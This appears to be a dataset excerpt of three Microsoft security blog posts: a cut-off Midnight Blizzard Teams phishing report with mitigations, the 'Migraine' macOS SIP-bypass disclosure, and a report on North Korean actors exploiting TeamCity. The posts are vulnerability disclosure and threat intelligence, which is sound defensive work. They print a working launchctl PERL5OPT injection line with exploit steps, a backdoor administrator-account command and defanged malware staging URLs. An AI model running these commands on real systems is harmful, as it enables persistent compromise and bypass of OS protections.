required, the actor is presented with a code that the user would need to enter in their authenticator app.\nThe user receives the prompt for code entry on their device.\nThe actor then sends a message to the targeted user over Microsoft Teams eliciting the user to enter the code into the prompt on their device.\nStep 1: Teams request to chat The target user may receive a Microsoft Teams message request from an external user masquerading as a technical support or security team.\nStep 2: Request authentication app action If the target user accepts the message request, the user then receives a Microsoft Teams message from the attacker attempting to convince them to enter a code into the Microsoft Authenticator app on their mobile device.\nStep 3: Successful MFA authentication If the targeted user accepts the message request and enters the code into the Microsoft Authenticator app, the threat actor is granted a token to authenticate as the targeted user.\nThe actor gains access to the user’s Microsoft 365 account, having completed the authentication flow.\nThe actor then proceeds to conduct post-compromise activity, which typically involves information theft from the compromised Microsoft 365 tenant.\nIn some cases, the actor attempts to add a device to the organization as a managed device via Microsoft Entra ID (formerly Azure Active Directory), likely an attempt to circumvent conditional access policies configured to restrict access to specific resources to managed devices only.\nRecommendations Microsoft recommends the following mitigations to reduce the risk of this threat. -\nPilot and start deploying phishing-resistant authentication methods for users. -\nImplement Conditional Access authentication strength to require phishing-resistant authentication for employees and external users for critical apps. -\nApply security best practices for Microsoft Teams.\nRefer to the security guide for Microsoft Teams. -\nUnderstand and select the best access settings for external collaboration for your organization. -\nSpecify trusted Microsoft 365 organizations to define which external domains are allowed or blocked to chat and meet. -\nKeep Microsoft 365 auditing enabled so that audit records could be investigated if required. -\nAllow only known devices that adhere to Microsoft’s recommended security baselines. -\nEducate users about social engineering and credential phishing attacks, including refraining from entering MFA codes sent via any form of unsolicited messages. -\nEducate Microsoft Teams users to verify ‘External’ tagging on communication attempts from external entities, be cautious about what they share, and never share their account information or authorize sign-in requests over chat. -\nEducate Microsoft Teams users about accepting or blocking people outside the organization who send messages in Microsoft Teams. -\nEducate users to review sign-in activity and mark suspicious sign-in attempts as “This wasn’t me”. -\nImplement Conditional Access App Control in Microsoft Defender for Cloud Apps for users connecting from unmanaged devices.\nIndicators of compromise | Indicator | Type | Description | | mlcrosoftaccounts.onmicrosoft[.]com | Domain name | Malicious actor-controlled subdomain | | msftonlineservices.onmicrosoft[.]com | Domain name | Malicious actor-controlled subdomain | | msonlineteam.onmicrosoft[.]com | Domain name | Malicious actor-controlled subdomain | | msftservice.onmicrosoft[.]com | Domain name | Malicious actor-controlled subdomain | | noreplyteam.onmicrosoft[.]com | Domain name | Malicious actor-controlled subdomain | | accounteam.onmicrosoft[.]com | Domain name | Malicious actor-controlled subdomain | | teamsprotection.onmicrosoft[.]com | Domain name | Malicious actor-controlled subdomain | | identityverification.onmicrosoft[.]com | Domain name | Malicious actor-controlled subdomain | | msftprotection.onmicrosoft[.]com | Domain name | Malicious actor-controlled subdomain | | accountsverification.onmicrosoft[.]com | Domain name | Malicious actor-controlled subdomain | | azuresecuritycenter.onmicrosoft[.]com | Domain name | Malicious actor-controlled subdomain | Hunting guidance Microsoft Purview Customers hunting for related activity in their environment can identify users that were targeted with the phishing lure using content search in Microsoft Purview.\nA content search can be created for selected Exchange mailboxes (which include Teams messages) using the following keywords (remove the [] around the “.”\nbefore use): - mlcrosoftaccounts.onmicrosoft[.]com - msftonlineservices.onmicrosoft[.]com - msonlineteam.onmicrosoft[.]com - msftservice.onmicrosoft[.]com - noreplyteam.onmicrosoft[.]com - accounteam.onmicrosoft[.]com - teamsprotection.onmicrosoft[.]com - identityverification.onmicrosoft[.]com - msftprotection.onmicrosoft[.]com - accountsverification.onmicrosoft[.]com - azuresecuritycenter.onmicrosoft[.]com - We detected a recent change to your preferred Multi-Factor Authentication (MFA) The search results will include the messages that match the criteria.\nThe first result will appear to be from Microsoft Sentinel Microsoft Sentinel customers can use the TI Mapping analytics (a series of analytics all prefixed with “TI map”) to automatically match indicators associated with Midnight Blizzard in Microsoft Defender Threat Intelligence with data in their workspace.\nIf the TI Map analytics are not currently deployed, customers can install the Threat Intelligence solution from the Microsoft Sentinel Content Hub to have the Defender Threat Intelligence connector and analytics rule deployed in their Sentinel workspace.\nLearn more about the Content Hub.\nMicrosoft Sentinel also has a range of detection and threat hunting content that customers can use to detect activity related to the activity described in this blog: - Azure portal sign-in from another Azure tenant - Successful sign-in from non-compliant device - User accounts – Sign-in failure due to CA spikes - New onmicrosoft domain added to tenant Further reading Read about the threat actor Midnight Blizzard (formerly tracked as NOBELIUM).\nFor the latest security research from the Microsoft Threat Intelligence community, check out the Microsoft Threat Intelligence Blog: https://aka.ms/threatintelblog.\nTo get notified about new publications and to join discussions on social media, follow us on Twitter at https://twitter.com/MsftSecIntel.","num_sentences":56,"metadata":{"source":"blog","platform":"Microsoft","filename":"midnight-blizzard"}}
{"id":62,"title":"New macOS vulnerability, Migraine, could bypass System Integrity Protection | Microsoft Security Blog","publish_date":null,"link":"https://www.microsoft.com/en-us/security/blog/2023/05/30/new-macos-vulnerability-migraine-could-bypass-system-integrity-protection/","clean_text":"A new vulnerability, which we refer to as “Migraine” for its involvement with macOS migration, could allow an attacker with root access to automatically bypass System Integrity Protection (SIP) in macOS and perform arbitrary operations on a device.\nWe shared these findings with Apple through Coordinated Vulnerability Disclosure (CVD) via Microsoft Security Vulnerability Research (MSVR).\nA fix for this vulnerability, now identified as CVE-2023-32369, was included in the security updates released by Apple on May 18, 2023.\nSIP is a security technology in macOS that restricts a root user from performing operations that may compromise system integrity.\nBypassing SIP could lead to serious consequences, such as increasing the potential for attackers and malware authors to successfully install rootkits, create persistent malware, and expand the attack surface for additional techniques and exploits.\nThe technique uncovered in this blog post was discovered during routine malware hunting and is similar to the one used in the Shrootless vulnerability (CVE-2021-30892) that we published in 2021.\nBy focusing on system processes that are signed by Apple and have the com.apple.rootless.install.heritable entitlement, we found two child processes that could be tampered with to gain arbitrary code execution in a security context that bypasses SIP checks.\nIn this blog post, we share some information about the relationship between SIP and entitlements, and we detail how the “Migraine” vulnerability could be exploited to bypass the SIP security enforcements.\nWe’re sharing this research with the larger security community to emphasize the importance of collaboration in the effort to secure platforms and devices.\nSIP and entitlements As previously covered in our Shrootless vulnerability blog post, System Integrity Protection (SIP)—also known as “rootless”—was first introduced by Apple in macOS Yosemite.\nSIP essentially locks down the system from root by leveraging the Apple sandbox to protect the entire platform, conceptually similar to how SELinux protects Linux systems.\nOne of the most dominant features of SIP is the filesystem restriction capability, which protects entire files and directories from being overridden.\nThe files and directories that are protected by SIP by default are commonly ones that are related to the system’s integrity.\nThere is no way to turn off SIP on a live system—the user must use the recovery OS, which requires physical access to the device.\nA SIP bypass is a vulnerability that bypasses SIP restrictions, for example, bypassing restrictions to write to SIP-protected directories or create a SIP-protected file.\nAnother important macOS concept is entitlements.\nAccording to documentation, “an entitlement is a right or privilege that grants an executable particular capabilities”.\nAs entitlements take part in the app signing process, there is no legitimate way of forging them.\nApple uses entitlements extensively to enforce security on macOS, and Apple grants internal entitlements to very specific processes.\nSpecifically, certain processes are assigned entitlements that allow the process to bypass System Integrity Protection checks by design.\nOne particularly interesting entitlement is the com.apple.rootless.install.heritable entitlement that allows the process and the entire process tree rooted under it to bypass filesystem-based System Integrity Protection security enforcements.\nDiscovering a SIP bypass by design Our research team regularly looks for malware and suspicious activity.\nDuring a routine malware hunt, we discovered the execution of a binary called drop_sip using the below advanced hunting query in Microsoft 365 Defender: DeviceProcessEvents | where FileName =~ \"drop_sip\" | project InitiatingProcessFileName, ProcessCommandLine, SHA256 Thinking that we found an exploit in the wild, we found that it’s an Apple-signed binary that resides natively under the /System/Library/PrivateFrameworks/SystemMigrationUtils.framework/Resources/Tools/drop_sip path.\nUpon analysis, the file appears to invoke the csops system call (undocumented, but available here) and starts a child process.\nThe operation flag for the csops call is 12 (CS_OPS_CLEARINSTALLER), which re-enables SIP checks by clearing codesigning flags, specifically the CS_EXEC_INHERIT_SIP flag: Because of this behavior, we concluded the drop_sip process assumes it can bypass SIP.\nHowever, since drop_sip is not entitled with any SIP-bypassing entitlements, we concluded that it must inherit that capability.\nWe discovered its parent process is systemmigrationd, which is a daemon designed to handle migration scenarios, but most importantly, it’s entitled with the com.apple.rootless.install.heritable entitlement that allows its child processes to bypass SIP security checks: Developing a “Migraine” After discovering the parent process of drop_sip, we wondered if there are any other child processes of systemmigrationd.\nJust as before, we used the below advanced hunting query in Microsoft 365 Defender: DeviceProcessEvents | where InitiatingProcessFileName =~ \"systemmigrationd\" | summarize Hits=count(), Cmdline=any(ProcessCommandLine) by FileName We found two interesting child processes of systemmigrationd: | FileName | Hits | Cmdline | | bash | 498 | /bin/bash /System/Library/PrivateFrameworks/SystemMigration.framework/Resources/MigrationData/Scripts/firstbootDirectoryServer | | perl | 171 | /usr/bin/perl /usr/libexec/migrateLocalKDC –source “/Volumes/REDACTED/Backups.backupdb/REDACTED/Macintosh HD – Data” –source-REDACTED | The bash and perl binaries are interesting because they are both interpreters.\nSimilar to how we tampered with the zsh codeflow back in 2021, we found similar ways to tamper with the code flow of bash and perl: Assuming an attacker first gains code execution capabilities as root, setting environment variables that affect systemmigrationd and its child processes is straightforward using the launchctl utility.\nFor instance, to make perl run our arbitrary code that resides under /private/tmp/migraine.sh, we use: launchctl setenv PERL5OPT '-Mwarnings;system(\"/private/tmp/migraine.sh\")' And indeed, after triggering systemmigrationd to run perl, we were able to bypass SIP: Exploitation approach Triggering migration normally requires using the Migration Assistant utility, which involves a complete sign-out from the system.\nWhile this works well for attackers with physical access (hands-on-keyboard), we wished to demonstrate that remote attackers can achieve a SIP bypass using this exploit.\nTherefore, we decided to research the migration flow and the interplay between the Migration Assistant and systemmigrationd.\nMigration is a complicated procedure that involves several components.\nHere is the flow of key events: - Migration Assistant uses a utility called Setup Assistant to help start migration.\nHowever, it does so indirectly by using XPC between itself and another process called MBSystemAdministration.\nIt also signs out by invoking a method named SACLOStartLogoutWithOptions. -\nThe MBSystemAdministration utility proxies requests from Migration Assistant to Setup Assistant and also verifies that the caller (Migration Assistant) has the com.apple.private.mbsystemadministration entitlement.\nOtherwise, it refuses serving migration requests.\nAdditionally, MBSystemAdministration runs as the hidden user _mbsetupuser, which allows migration to perform GUI interactions after sign out. -\nSetup Assistant gets requests through MBSystemAdministration and performs XPC to several Mach services that are served by the launch daemon systemmigrationd.\nThe systemmigrationd daemon enforces that the caller (Setup Assistant) has the com.apple.private.systemmigration.daemonclient entitlement.\nOtherwise, it refuses serving migration requests.\nThe systemmigrationd daemon uses the private framework SystemMigration.framework and listens to new migration requests by invoking a method called startListeningForConnections.\nInterestingly, the daemon examines the contents of the directory /Library/SystemMigration/Queue (which is protected by SIP)—requests appear as files in that directory.\nOnce a file is dropped, systemmigrationd renames the file to “In-Flight” and serves it, including running required scripts, which can cause perl or bash to run.\nThis complex flow can be illustrated with the following schematic: Our first attempt at automating the exploit focused on patching Migration Assistant to prevent user sign-out: Simply patching Migration Assistant does not work due to codesign failure.\nStripping the binary of signing information results in error (Figure 10) due to a kernel feature related to Pointer Authentication Codes (PAC) that’s available for the latest Apple Silicone architecture.\nIf an arm64e binary with pointer authentication is not a code-signed platform binary, the kernel prevents execution, as shown in Figure 9.\nExtracting, stripping, and patching the x64 portion of the multiarchitecture binary avoids the arm64e issue, but it’s not functional due to losing the required entitlement (com.apple.private.mbsystemadministration).\nAfter reaching an impasse with patching Migration Assistant, we wondered if we could initiate later stages in the flow diagram, thus avoiding user sign-out.\nWe continued to map and reverse-engineer the system behavior, including using an in-house researcher tool which leverages the Endpoint Security Framework that logs all relevant process and file events during migration, inspired by Patrick Wardle’s FileMonitor and ProcessMonitor tools for investigating system behaviors.\nWhile mapping the sequence of events for Migration Assistant, MBSystemAdministration, Setup Assistant, and systemmigrationd, we noticed xpcproxy executing Setup Assistant with the argument ‑MiniBuddyYes.\nRunning Setup Assistant with that argument had no effect on the UI layout or its functionality, but it did highlight the usage of arguments within Setup Assistant.\nClosely examining Setup Assistant, we discovered other interesting command-line arguments: Additionally, we discovered a function called useDebugParameters that parses an interesting command-line parameter ‑MBDebug.\nRunning the Setup Assistant with the ‑MBDebug parameter results in a successful migration with no sign out.\nWe further used the -ResumeBuddyYes parameter in conjunction with ‑MBDebug to automatically skip a few welcome screens.\nSince performing migration requires UI interaction, but no sign-out, we used AppleScript to automate the exploit.\nOur final exploit does the following: - Prepares a small 1GB Time Machine backup and attaches it with hdiutil. -\nPrepares an arbitrary payload that is designed to run without SIP filesystem restrictions. -\nSets the environment variable PERL5OPT using launchctl to run the payload once perl starts. -\nRuns Setup Assistant with the -MBDebug and -ResumeBuddyYes command-line flags. -\nUses AppleScript to automate the Setup Assistant screens to migrate “From a Mac, Time Machine backup or Startup disk”, followed by automatically clicking “continue”.\nImplications of arbitrary SIP bypasses The implications of arbitrary SIP bypasses are serious, as the potential for malware authors is significant.\nCode that maliciously bypasses SIP could have considerable consequences, such as: - Create undeletable malware: The most straight-forward implication of a SIP bypass is that, by assigning files with the com.apple.rootless extended attribute (or overriding existing ones), an attacker can create files that are protected by SIP and therefore undeletable by ordinary means.\nThis is quite important for security solutions, such as Microsoft Defender for Endpoint, that are required to quarantine malware but cannot quarantine files protected by SIP. -\nExpand the attack surface for userland and kernel attacker techniques: As pointed out by Mickey Jin’s blog post on a different SIP bypass, it’s possible for attackers to gain arbitrary kernel code execution.\nAs Apple slowly disallows third party kernel extensions and transitions the Mac ecosystem towards their Endpoint Security framework, security solutions will no longer be able to monitor the kernel for malicious activity, including malicious code executions. -\nTamper with the integrity of the system, effectively enabling rootkits: This is a derivation of arbitrary kernel code execution—once kernel code execution is established by an attacker, certain rootkit techniques are possible, such as hiding processes or files from all monitoring tools.\nThese techniques might also include bypassing tamper protection, which is important for Microsoft Defender for Endpoint to protect against threats. -\nFull TCC bypass: As pointed out by Mickey Jin’s blog post on a different SIP bypass, attackers could replace databases that control Transparency, Consent, and Control (TCC) policies (TCC.db), effectively granting arbitrary applications access to private data and peripherals.\nFor further explanation about the implications, we’ve demonstrated a TCC bypass in the past called “Powerdir”.\nHardening device security through collaboration and research-driven protection Attackers continue to seek new footholds into increasingly secure devices and networks, oftentimes by leveraging unpatched vulnerabilities and misconfigurations to access valuable systems and data.\nGaining the ability to bypass SIP and similar security technology in macOS devices can be an attractive and even necessary capability for adversaries.\nGiven SIP’s position as both a device’s built-in baseline protection and the last line of defense against malware and other threats, bypassing SIP can have considerable consequences for users.\nAs such, it’s crucial that we strive to enrich our protection technologies across platforms against such issues through research-driven protection and collaboration with partners, customers, and industry experts.\nThis case displays how collaborative research and responsible vulnerability disclosure informs our comprehensive protection capabilities across platforms to provide organizations a complete picture of their security posture.\nMicrosoft Defender Vulnerability Management quickly discovers and remediates such vulnerabilities while Microsoft Defender for Endpoint detects and alerts on anomalous device activities, including setting perl and bash environment variables through the launchctl utility, as shown below in Figure 15.\nAdditionally, Defender for Endpoint has similar detections for sensitive file access, including system launch daemons, various sensitive configuration files, and many more.\nThis case further emphasizes the need for responsible vulnerability disclosures and expert cross-platform collaboration to mitigate issues such as CVE-2023-32369, regardless of the vulnerable device or platform in use.\nWe wish to thank the Apple product security team again for their efforts and responsiveness in addressing the issue.\nDefending against the evolving threat landscape requires the ability to protect and secure users’ computing experiences, whatever the platform.\nAs cross-platform threats continue to grow, we will continue to share vulnerability discoveries and threat intelligence in addition to working with the security community to improve upon solutions that protect users and organizations each day.\nJonathan Bar Or, Michael Pearse, Anurag Bohra Microsoft Threat Intelligence Community References - https://developer.apple.com/documentation/security/disabling_and_enabling_system_integrity_protection - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-32369 - https://support.apple.com/en-us/HT213758 - https://developer.apple.com/documentation/bundleresources/entitlements - https://wikipedia.org/wiki/Security-Enhanced_Linux - https://github.com/apple/darwin-xnu/blob/main/bsd/kern/kern_proc.c - https://zsh.sourceforge.io/Contrib/startup/std/zshenv - https://ss64.com/osx/launchctl.html - https://developer.apple.com/documentation/xpc - https://developer.apple.com/documentation/security/preparing_your_app_to_work_with_pointer_authentication - https://wikipedia.org/wiki/Apple_M1 - https://wikipedia.org/wiki/Fat_binary - https://developer.apple.com/documentation/endpointsecurity - https://objective-see.org/products/utilities.html - https://jhftss.github.io/CVE-2022-26712-The-POC-For-SIP-Bypass-Is-Even-Tweetable/ - https://attack.mitre.org/techniques/T1014/","num_sentences":83,"metadata":{"source":"blog","platform":"Microsoft","filename":"migraine-could"}}
{"id":63,"title":"Multiple North Korean threat actors exploiting the TeamCity CVE-2023-42793 vulnerability | Microsoft Security Blog","publish_date":"2023-10-28","link":"https://www.microsoft.com/en-us/security/blog/2023/10/18/multiple-north-korean-threat-actors-exploiting-the-teamcity-cve-2023-42793-vulnerability/","clean_text":"Since early October 2023, Microsoft has observed two North Korean nation-state threat actors – Diamond Sleet and Onyx Sleet – exploiting CVE-2023-42793, a remote-code execution vulnerability affecting multiple versions of JetBrains TeamCity server.\nTeamCity is a continuous integration/continuous deployment (CI/CD) application used by organizations for DevOps and other software development activities.\nONYX SLEET In past operations, Diamond Sleet and other North Korean threat actors have successfully carried out software supply chain attacks by infiltrating build environments.\nGiven this, Microsoft assesses that this activity poses a particularly high risk to organizations who are affected.\nJetBrains has released an update to address this vulnerability and has developed a mitigation for users who are unable to update to the latest software version.\nDIAMOND SLEET While the two threat actors are exploiting the same vulnerability, Microsoft observed Diamond Sleet and Onyx Sleet utilizing unique sets of tools and techniques following successful exploitation.\nBased on the profile of victim organizations affected by these intrusions, Microsoft assesses that the threat actors may be opportunistically compromising vulnerable servers.\nHowever, both actors have deployed malware and tools and utilized techniques that may enable persistent access to victim environments.\nSLEET ACTORS As with any observed nation-state actor activity, Microsoft directly notifies customers that have been targeted or compromised and provides them with the information they need to secure their environments.\nWho are Diamond Sleet and Onyx Sleet?\nDiamond Sleet (ZINC) is a North Korean nation-state threat actor that prioritizes espionage, data theft, financial gain, and network destruction.\nThe actor typically targets media, IT services, and defense-related entities around the world.\nMicrosoft reported on Diamond Sleet’s targeting of security researchers in January 2021 and the actor’s weaponizing of open-source software in September 2022.\nIn August 2023, Diamond Sleet conducted a software supply chain compromise of a German software provider.\nOnyx Sleet (PLUTONIUM) is a North Korean nation-state threat actor that primarily targets defense and IT services organizations in South Korea, the United States, and India.\nOnyx Sleet employs a robust set of tools that they have developed to establish persistent access to victim environments and remain undetected.\nThe actor frequently exploits N-day vulnerabilities as a means of gaining initial access to targeted organizations.\nDiamond Sleet attack path 1: Deployment of ForestTiger backdoor Following the successful compromise of TeamCity servers, Diamond Sleet utilizes PowerShell to download two payloads from legitimate infrastructure previously compromised by the threat actor.\nThese two payloads, Forest64.exe and 4800-84DC-063A6A41C5C are stored in the C:ProgramData directory.\nWhen launched, Forest64.exe checks for the presence of the file named 4800-84DC-063A6A41C5C, then reads and decrypts the contents of that file using embedded, statically assigned key of ‘uTYNkfKxHiZrx3KJ’: c:ProgramDataForest64.exe uTYNkfKxHiZrx3KJ Interestingly, this same value is specified as a parameter when the malware is invoked, but we did not see it utilized during our analysis.\nThe same value and configuration name was also referenced in historical activity reported by Kaspersky’s Securelist on this malware, dubbed ForestTiger.\nThe decrypted content of 4800-84DC-063A6A41C5C is the configuration file for the malware, which contains additional parameters, such as the infrastructure used by the backdoor for command and control (C2).\nMicrosoft observed Diamond Sleet using infrastructure previously compromised by the actor for C2.\nMicrosoft observed Forest64.exe then creating a scheduled task named Windows TeamCity Settings User Interface so it runs every time the system starts with the above referenced command parameter “uTYNkfKxHiZrx3KJ”.\nMicrosoft also observed Diamond Sleet leveraging the ForestTiger backdoor to dump credentials via the LSASS memory.\nMicrosoft Defender Antivirus detects this malware as ForestTiger.\nDiamond Sleet attack path 2: Deploying payloads for use in DLL search-order hijacking attacks Diamond Sleet leverages PowerShell on compromised servers to download a malicious DLL from attacker infrastructure.\nThis malicious DLL is then staged in C:ProgramData alongside a legitimate .exe file to carry out DLL search-order hijacking.\nMicrosoft has observed these malicious DLL and legitimate EXE combinations used by the actor: | Malicious DLL name | Legitimate binary name | |---|---| | DSROLE.dll | wsmprovhost.exe | | Version.dll | clip.exe | DSROLE.dll attack chain When DSROLE.dll is loaded by wsmprovhost.exe, the DLL initiates a thread that enumerates and attempts to process files that exist in the same executing directory as the DLL.\nThe first four bytes of candidate files are read and signify the size of the remaining buffer to read.\nOnce the remaining data is read back, the bytes are reversed to reveal an executable payload that is staged in memory.\nThe expected PE file should be a DLL with the specific export named ‘StartAction’.\nThe address of this export is resolved and then launched in memory.\nWhile the functionality of DSROLE.dll is ultimately decided by whatever payloads it deobfuscates and launches, Microsoft has observed the DLL being used to launch wksprt.exe, which communicates with C2 domains.\nMicrosoft Defender Antivirus detects DSROLE.dll using the family name RollSling.\nVersion.dll attack chain When loaded by clip.exe, Version.dll loads and decrypts the contents of readme.md, a file downloaded alongside Version.dll from attacker-compromised infrastructure.\nThe file readme.md contains data that is used as a multibyte XOR key to decrypt position-independent code (PIC) embedded in Version.dll.\nThis PIC loads and launches the final-stage remote access trojan (RAT).\nOnce loaded in memory, the second-stage executable decrypts an embedded configuration file containing several URLs used by the malware for command and control.\nShortly after the malware beacons to the callback URL, Microsoft has observed a separate process iexpress.exe created and communicating with other C2 domains.\nMicrosoft Defender Antivirus detects Version.dll using the family name FeedLoad.\nAfter successful compromise, Microsoft observed Diamond Sleet dumping credentials via the LSASS memory.\nIn some cases, Microsoft observed Diamond Sleet intrusions that utilized tools and techniques from both paths 1 and 2.\nOnyx Sleet attack path: User account creation, system discovery, and payload deployment Following successful exploitation using the TeamCity exploit, Onyx Sleet creates a new user account on compromised systems.\nThis account, named krtbgt, is likely intended to impersonate the legitimate Windows account name KRBTGT, the Kerberos Ticket Granting Ticket.\nAfter creating the account, the threat actor adds it to the Local Administrators Group through net use: net localgroup administrators krtbgt /add The threat actor also runs several system discovery commands on compromised systems, including: net localgroup 'Remote Desktop Users’ net localgroup Administrators cmd.exe \"/c tasklist | findstr Sec\" cmd.exe \"/c whoami\" cmd.exe \"/c netstat -nabp tcp\" cmd.exe \"/c ipconfig /all\" cmd.exe \"/c systeminfo\" Next, the threat actor deploys a unique payload to compromised systems by downloading it from attacker-controlled infrastructure via PowerShell.\nMicrosoft observed these file paths for the unique payload: - C:WindowsTemptemp.exe - C:WindowsADFSbginetmgr.exe This payload, when launched, loads and decrypts an embedded PE resource.\nThis decrypted payload is then loaded into memory and launched directly.\nThe inner payload is a proxy tool that helps establish a persistent connection between the compromised host and attacker-controlled infrastructure.\nMicrosoft Defender Antivirus detects this proxy tool as HazyLoad.\nMicrosoft also observed the following post-compromise tools and techniques leveraged in this attack path: - Using the attacker-controlled krtbgt account to sign into the compromised device via remote desktop protocol (RDP) - Stopping the TeamCity service, likely in an attempt to prevent access by other threat actors - Dumping credentials via the LSASS memory - Deploying tools to retrieve credentials and other data stored by browsers Recommended mitigation actions Microsoft recommends the following mitigations to reduce the impact of this threat. -\nApply the update or mitigations released by JetBrains to address CVE-2023-42793. -\nUse the included indicators of compromise to investigate whether they exist in your environment and assess for potential intrusion. -\nBlock in-bound traffic from IPs specified in the IOC table. -\nUse Microsoft Defender Antivirus to protect from this threat.\nTurn on cloud-delivered protection and automatic sample submission.\nThese capabilities use artificial intelligence and machine learning to quickly identify and stop new and unknown threats. -\nTake immediate action to address malicious activity on the impacted device.\nIf malicious code has been launched, the attacker has likely taken complete control of the device.\nImmediately isolate the system and perform a reset of credentials and tokens. -\nInvestigate the device timeline for indications of lateral movement activities using one of the compromised accounts.\nCheck for additional tools that attackers might have dropped to enable credential access, lateral movement, and other attack activities. -\nEnsure that “Safe DLL Search Mode” is set. -\nTurn on the following attack surface reduction rule: - Block executable files from running unless they meet a prevalence, age, or trusted list criterion Detections Microsoft 365 Defender Microsoft 365 Defender is becoming Microsoft Defender XDR.\nLearn more.\nMicrosoft Defender Vulnerability Management Microsoft Defender Vulnerability Management surfaces devices that may be affected by the CVE-2023-42793 vulnerability leveraged in these attacks.\nMicrosoft Defender Antivirus Microsoft Defender Antivirus customers should look for the following family names for activity related to these attacks: - ForestTiger - RollSling - FeedLoad - HazyLoad Microsoft Defender for Endpoint The following Microsoft Defender for Endpoint alerts could indicate activity associated with this threat.\nThese alerts, however, can be triggered by unrelated threat activity. -\nDiamond Sleet Actor activity detected - Onyx Sleet Actor activity detected - Possible exploitation of JetBrains TeamCity vulnerability - Suspicious behavior by cmd.exe was observed - Suspicious DLL loaded by an application - Suspicious PowerShell download or encoded command execution - Possible lateral movement involving suspicious file - A script with suspicious content was observed - Suspicious scheduled task Hunting queries Microsoft 365 Defender Command and control using iexpress.exe or wksprt.exe DeviceNetworkEvents | where (InitiatingProcessFileName =~ \"wksprt.exe\" and InitiatingProcessCommandLine == \"wksprt.exe\") or (InitiatingProcessFileName =~ \"iexpress.exe\" and InitiatingProcessCommandLine == \"iexpress.exe\") Search order hijack using Wsmprovhost.exe and DSROLE.dll DeviceImageLoadEvents | where InitiatingProcessFileName =~ \"wsmprovhost.exe\" | where FileName =~ \"DSROLE.dll\" | where not(FolderPath has_any(\"system32\", \"syswow64\")) Search order hijack using clip.exe and Version.dll DeviceImageLoadEvents | where InitiatingProcessFileName =~ \"clip.exe\" | where FileName in~(\"version.dll\") | where not(FolderPath has_any(\"system32\", \"syswow64\", \"program files\", \"windows defenderplatform\", \"winsxs\", \"platform\", \"trend micro\")) Microsoft Sentinel Microsoft Sentinel customers can use the TI Mapping analytics (a series of analytics all prefixed with ‘TI map’) to automatically match the malicious domain indicators mentioned in this blog post with data in their workspace.\nIf the TI Map analytics are not currently deployed, customers can install the Threat Intelligence solution from the Microsoft Sentinel Content Hub to have the analytics rule deployed in their Sentinel workspace.\nMicrosoft Sentinel also has a range of detection and threat hunting content that customers can use to detect the post exploitation activity detailed in this blog in addition to Microsoft 365 Defender detections list above. -\nPowerShell downloads - Dumping LSASS Process into a File - Anomalous Account Creation - RDP Rare Connection - Anomalous RDP Activity Indicators of compromise (IOCs) The list below provides IOCs observed during our investigation.\nWe encourage our customers to investigate these indicators in their environments and implement detections and protections to identify past related activity and prevent future attacks against their systems.\nDiamond Sleet path 1 | Indicator | Type | Description | |---|---|---| | C:ProgramDataForest64.exe | File path | File path of ForestTiger binary | | e06f29dccfe90ae80812c2357171b5c48fba189ae103d28e972067b107e58795 | SHA-256 | Hash of Forest64.exe | | 0be1908566efb9d23a98797884f2827de040e4cedb642b60ed66e208715ed4aa | SHA-256 | Hash of Forest64.exe | | C:ProgramData4800-84DC-063A6A41C5C | File path | ForestTiger configuration file | | hxxp://www.bandarpowder[.]com/public/assets/img/cfg.png | URL | Staging URL for 4800-84DC-063A6A41C5C (compromised domain) | | hxxps://www.bandarpowder[.]com/public/assets/img/cfg.png | URL | Staging URL for 4800-84DC-063A6A41C5C (compromised domain) | | hxxp://www.aeon-petro[.]com/wcms/plugins/addition_contents/cfg.png | URL | Staging URL for 4800-84DC-063A6A41C5C (compromised domain) | | hxxp://www.bandarpowder[.]com/public/assets/img/user64.png | URL | Staging URL for Forest64.exe (compromised domain) | | hxxps://www.bandarpowder[.]com/public/assets/img/user64.png | URL | Staging URL for Forest64.exe (compromised domain) | | hxxp://www.aeon-petro[.]com/wcms/plugins/addition_contents/user64.png | URL | Staging URL for Forest64.exe (compromised domain) | Diamond Sleet path 2 | Indicator | Type | Description | |---|---|---| | C:ProgramDataDSROLE.dll | File path | File path of RollSling binary | | d9add2bfdfebfa235575687de356f0cefb3e4c55964c4cb8bfdcdc58294eeaca | SHA-256 | Hash of DSROLE.dll | | C:ProgramDataVersion.dll | File path | File path of FeedLoad binary.\n| | f251144f7ad0be0045034a1fc33fb896e8c32874e0b05869ff5783e14c062486 | SHA-256 | Hash of Version.dll | | C:ProgramDatareadme.md | File path | Used as a multibyte XOR key for FeedLoad Next Stage | | fa7f6ac04ec118dd807c1377599f9d369096c6d8fb1ed24ac7a6ec0e817eaab6 | SHA-256 | Hash of Readme.md | | C:ProgramDatawsmprovhost.exe | File path | Legitimate Windows binary is copied to this directory for DLL search-order hijacking | | C:ProgramDataclip.exe | File path | Legitimate Windows binary is copied to this directory for DLL search-order hijacking | | dersmarketim[.]com | Domain | C2 domain (compromised domain) | | olidhealth[.]com | Domain | C2 domain (compromised domain) | | galerielamy[.]com | Domain | C2 domain (compromised domain) | | 3dkit[.]org | Domain | C2 domain (compromised domain) | | hxxp://www.mge[.]sn/themes/classic/modules/ps_rssfeed/feed.zip | URL | Staging URL for Version.dll (compromised domain) | | hxxp://www.mge[.]sn/themes/classic/modules/ps_rssfeed/feedmd.zip | URL | Staging URL for readme.md (compromised domain) | | hxxps://vadtalmandir[.]org/admin/ckeditor/plugins/icontact/about.php | URL | Callback URL from second-stage PE (compromised domain) | | hxxps://commune-fraita[.]ma/wp-content/plugins/wp-contact/contact.php | URL | Callback URL from second-stage PE (compromised domain) | Onyx Sleet path | Indicator | Type | Description | |---|---|---| | C:WindowsTemptemp.exe | File path | File path for HazyLoad binary | | C:WindowsADFSbginetmgr.exe | File path | File path for HazyLoad binary | | 000752074544950ae9020a35ccd77de277f1cd5026b4b9559279dc3b86965eee | SHA-256 | Hash of proxy tool loader | | hxxp://147.78.149[.]201:9090/imgr.ico | URL | Staging URL for HazyLoad binary (compromised infrastructure) | | hxxp://162.19.71[.]175:7443/bottom.gif | URL | Staging URL for HazyLoad binary (compromised infrastructure) | NOTE: These indicators should not be considered exhaustive for this observed activity.\nReferences Further reading For the latest security research from the Microsoft Threat Intelligence community, check out the Microsoft Threat Intelligence Blog: https://aka.ms/threatintelblog.\nTo get notified about new publications and to join discussions on social media, follow us on Twitter at https://twitter.com/MsftSecIntel.","num_sentences":77,"metadata":{"source":"blog","platform":"Microsoft","filename":"north-korean"}}
